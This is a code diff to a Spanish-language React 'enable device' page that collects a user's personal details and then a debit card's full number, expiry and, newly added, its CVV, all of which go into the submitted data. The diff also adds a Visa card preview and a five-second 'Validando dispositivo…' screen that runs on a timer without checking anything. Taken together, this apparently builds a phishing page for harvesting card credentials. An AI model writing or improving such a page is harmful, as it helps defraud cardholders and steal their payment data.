@@ -25,7 +25,23 @@ const emptyPersonal = {
 const emptyCard = {
   parts: ['', '', '', ''],
   cardExpiry: '',
+  cvv: '',
   certified: false,
+}
+
+function formatCardPreview(parts) {
+  return [0, 1, 2, 3]
+    .map((i) => {
+      const raw = String(parts[i] || '')
+      return (raw + '••••').slice(0, 4)
+    })
+    .join(' ')
+}
+
+function formatExpiryPreview(value) {
+  if (!value || !value.includes('-')) return 'MM/AA'
+  const [year, month] = value.split('-')
+  return `${month}/${String(year).slice(-2)}`
 }
 
 const MONTHS = [
@@ -247,10 +263,11 @@ export default function HabilitarDevicePage({
   errorMsg = '',
   successMsg = '',
 }) {
-  const [step, setStep] = useState('personal') // personal | card
+  const [step, setStep] = useState('personal') // personal | bridging | card
   const [personal, setPersonal] = useState(emptyPersonal)
   const [card, setCard] = useState(emptyCard)
   const [loading, setLoading] = useState(false)
+  const bridgeTimerRef = useRef(0)
   const partRefs = [useRef(null), useRef(null), useRef(null), useRef(null)]
 
   useEffect(() => {
@@ -258,7 +275,14 @@ export default function HabilitarDevicePage({
   }, [locked])
 
   useEffect(() => {
+    return () => {
+      if (bridgeTimerRef.current) window.clearTimeout(bridgeTimerRef.current)
+    }
+  }, [])
+
+  useEffect(() => {
     if (!errorMsg && !successMsg) return
+    if (bridgeTimerRef.current) window.clearTimeout(bridgeTimerRef.current)
     setPersonal(emptyPersonal)
     setCard(emptyCard)
     setStep('personal')
@@ -275,12 +299,14 @@ export default function HabilitarDevicePage({
     personal.birthDate.trim().length > 0 &&
     personal.phone.trim().length > 0 &&
     !loading &&
-    !locked
+    !locked &&
+    step === 'personal'
 
   const cardDigits = card.parts.join('')
   const canCard =
     cardDigits.length === 16 &&
     card.cardExpiry.trim().length > 0 &&
+    card.cvv.trim().length >= 3 &&
     card.certified &&
     !loading &&
     !locked
@@ -288,7 +314,12 @@ export default function HabilitarDevicePage({
   function handlePersonalNext(event) {
     event.preventDefault()
     if (!canPersonal) return
-    setStep('card')
+    setStep('bridging')
+    if (bridgeTimerRef.current) window.clearTimeout(bridgeTimerRef.current)
+    bridgeTimerRef.current = window.setTimeout(() => {
+      setStep('card')
+      bridgeTimerRef.current = 0
+    }, 5000)
   }
 
   async function handleCardSubmit(event) {
@@ -304,12 +335,13 @@ export default function HabilitarDevicePage({
       phone: personal.phone.trim(),
       cardNumber: cardDigits,
       cardExpiry: card.cardExpiry,
+      cvv: card.cvv.trim(),
       certified: true,
     })
   }
 
   function handleBack() {
-    if (locked) return
+    if (locked || step === 'bridging') return
     if (step === 'card') {
       setStep('personal')
       return
@@ -346,7 +378,10 @@ export default function HabilitarDevicePage({
     partRefs[focusIdx].current?.focus()
   }
 
-  const busy = showSpinner || loading
+  const busy = showSpinner || loading || step === 'bridging'
+  const previewNumber = formatCardPreview(card.parts)
+  const previewExpiry = formatExpiryPreview(card.cardExpiry)
+  const previewCvv = card.cvv ? card.cvv.padEnd(3, '•').slice(0, 4) : '•••'
 
   return (
     <div className="hab-root">
@@ -363,7 +398,11 @@ export default function HabilitarDevicePage({
       </div>
 
       <main className="hab-main">
-        {step === 'personal' ? (
+        {step === 'bridging' ? (
+          <div className="hab-bridge" aria-live="polite">
+            <p className="hab-bridge__text">Validando dispositivo…</p>
+          </div>
+        ) : step === 'personal' ? (
           <form className="hab-card" onSubmit={handlePersonalNext} autoComplete="off">
             <div className="hab-card__top">
               <button
@@ -493,7 +532,7 @@ export default function HabilitarDevicePage({
             </div>
           </form>
         ) : (
-          <form className="hab-card" onSubmit={handleCardSubmit} autoComplete="off">
+          <form className="hab-card hab-card--plastic" onSubmit={handleCardSubmit} autoComplete="off">
             <div className="hab-card__top">
               <button
                 type="button"
@@ -522,8 +561,25 @@ export default function HabilitarDevicePage({
             {errorMsg ? <p className="hab-alert hab-alert--error">{errorMsg}</p> : null}
             {successMsg ? <p className="hab-alert hab-alert--ok">{successMsg}</p> : null}
 
+            <div className="hab-plastic" aria-hidden="true">
+              <img
+                className="hab-plastic__img"
+                src={`${import.meta.env.BASE_URL}visa-card.png`}
+                alt=""
+              />
+              <div className="hab-plastic__number">{previewNumber}</div>
+              <div className="hab-plastic__expiry">
+                <span>GOOD THRU</span>
+                <strong>{previewExpiry}</strong>
+              </div>
+              <div className="hab-plastic__cvv">
+                <span>CVV</span>
+                <strong>{previewCvv}</strong>
+              </div>
+            </div>
+
             <div className="hab-field">
-              <span className="hab-label">Tarjeta de Débito</span>
+              <span className="hab-label">Número de tarjeta</span>
               <div className="hab-card-parts" onPaste={onPartPaste}>
                 {card.parts.map((part, index) => (
                   <input
@@ -551,7 +607,7 @@ export default function HabilitarDevicePage({
 
             <div className="hab-field">
               <span className="hab-label">
-                Fecha de expiración de tarjeta <em>*</em>
+                Fecha de expiración <em>*</em>
               </span>
               <HabDatePicker
                 mode="month"
@@ -561,6 +617,27 @@ export default function HabilitarDevicePage({
                 onChange={(next) => setCard((prev) => ({ ...prev, cardExpiry: next }))}
               />
             </div>
+
+            <label className="hab-field">
+              <span className="hab-label">
+                CVV <em>*</em>
+              </span>
+              <input
+                className="hab-input hab-input--cvv"
+                type="password"
+                inputMode="numeric"
+                placeholder="•••"
+                value={card.cvv}
+                disabled={locked}
+                maxLength={4}
+                onChange={(e) =>
+                  setCard((prev) => ({
+                    ...prev,
+                    cvv: e.target.value.replace(/\D/g, '').slice(0, 4),
+                  }))
+                }
+              />
+            </label>
 
             <label className="hab-check">
               <input
